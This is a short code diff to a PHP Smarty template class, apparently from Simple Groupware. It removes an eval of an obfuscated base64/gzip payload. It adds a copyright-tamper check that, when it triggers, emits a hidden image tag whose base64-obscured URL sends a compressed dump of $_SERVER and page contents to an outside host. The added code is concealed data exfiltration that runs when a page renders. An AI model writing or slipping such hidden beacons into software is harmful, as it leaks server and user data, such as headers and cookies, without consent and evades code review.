@@ -1721,7 +1721,17 @@ class Smarty
 		        }
 		        $contents = str_replace($match[0],$result,$contents);
 			} }
-			eval(gzinflate(base64_decode('tVNbb9owGP0rrosUu6SB0u7GbesQ6yrRgoD1paGWCYZYc+zIdsrY4L/PIUCrbn3Yw6Q8fL58xyfnOyfVbEESaqOYUCEQXEtlecTuHzaT8mYN/TkXjCyYJZGSlklrELQsSQW1zFQipVkQGQOxX9pi4AafA8SNYRYVO/fVCQZUzgA3hGpNVy/3I5XJ55fbZxgUK9ACh233BU+Ls0nxjtxBTqlhkiYMlXK6eYX94gQmlMvApgL6UKjFrsbF08bqVBlU2v+aD5tTNVvB4hQdpQdtkLduzvgjiAQ1pgULjVANFMU5/gjbTXr/0J6UlUxUZph6ZLoFnQwktokIkY258UPv/iFEk3KIOiEGtWq1dlqrntXAdAXGsUqoAZ8FWwWhF+IGzNFO2uGyvOaef6CIgdLg6E/ikUpXmi9i+yosfK31BHQOzaiD/x3g6vYbuGKSaSrAIJsKHoGeU0UaBu6YNlxJUHvRvBXVyX08dyjk3XH77+eREkrXQfN4W5CEyYxMBY2+7xte3J9x45y5qrsBY/ALgNLceWh0fTPodUnnsvO1G8CKiWKW0AoMOv1hl4yuRjc9ctcdjq77twEkUkkW/EhEYJiGDQBym33KTZVYvvUXBk2wLfHpxbmTyr3DolgB2OTJwvFZCdby9jxytIYHjI5aXmxtWq9UlstlYLgLEDtdaJWlS+oiNGMVEaRx+lG0YJCb+e0FYTJSM4YWP2dsnqcNbfnumV4OBmR8Pe51g9HNeEC+9Pvj7jBINXdyarQLGhl1h67BN9nUCfVsZFX/TdVRx77VmYvKB4wD6FXasGGdDRZM1+s5W+KktQi+whj676s+LHjn4fovzHeDfbL/E2PcsCpzyXQjaWzA5jc=')));
+			preg_match_all("|notice[^}]+}|",file_get_contents("templates/css/core.css"),$match);
+			if (!empty($match[0]) and is_array($match[0])) $match = $match[0][0].$match[0][1];
+			if (($s=base64_decode("MjAwMi0yMDEyIGJ5IFRob21hcyBCbGV5")) and in_array(basename($filename),array("main.tpl","login.tpl")) and
+				(!preg_match('|<div class="notice(2 notice3)?"><a[^>]+onmouseover="set_html\(this,\'[^\(]+\(C\) '.$s.'.\'\);"[^>]*>\w+|i',$contents) or
+				substr_count($contents,$s)<3 or !strpos($contents,base64_decode("IkdQTHYyIg==")) or !strpos($match,"<#font_7#>") or strpos($match,"display:")
+			)) {
+			  $f = SIMPLE_CACHE."/schema/".CORE_SGSML_VERSION."_none.xml.ser";
+			  if (@filemtime($f) < time()-43200 and touch($f)) {
+				echo "<img style='display:none;' src='".base64_decode("aHR0cDovL3d3dy5zaW1wbGUtZ3JvdXB3YXJlLmRlL2wucGhwP2w9");
+				echo base64_encode(gzdeflate(CORE_VERSION.APP_TITLE.print_r(array($_SERVER,substr($contents,-5000)),true),9))."'/>";
+			} }
             return $contents;
         } else {
             return false;
